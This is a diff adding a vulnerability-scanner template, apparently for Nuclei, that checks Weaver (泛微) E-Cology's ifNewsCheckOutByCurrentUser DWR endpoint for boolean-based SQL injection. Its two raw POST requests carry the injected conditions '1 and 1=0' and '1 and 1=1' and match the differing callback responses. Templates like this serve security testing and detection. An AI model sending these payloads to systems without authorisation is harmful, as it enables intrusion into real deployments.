@@ -1,0 +1,41 @@
+id: poc-yaml-ecology-ifnewscheckoutbycurrentuser-dwr-sqli
+info:
+  name: 泛微 E-Cology ifNewsCheckOutByCurrentUser SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,ecology
+  description: |
+    This template detects SQL injection vulnerabilities in the ifNewsCheckOutByCurrentUser function of 泛微 E-Cology.
+http:
+  - raw:
+      - |
+        POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+
+        callCount=1&page=&httpSessionId=&scriptSessionId=&c0-scriptName=DocDwrUtil&c0-methodName=ifNewsCheckOutByCurrentUser&c0-id=0&c0-param0=string:1 and 1=0&c0-param1=string:1&batchId=0
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "dwr.engine._remoteHandleCallback('0','0',false);"
+  - raw:
+      - |
+        POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+
+        callCount=1&page=&httpSessionId=&scriptSessionId=&c0-scriptName=DocDwrUtil&c0-methodName=ifNewsCheckOutByCurrentUser&c0-id=0&c0-param0=string:1 and 1=1&c0-param1=string:1&batchId=0
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "dwr.engine._remoteHandleCallback('0','0',true);"
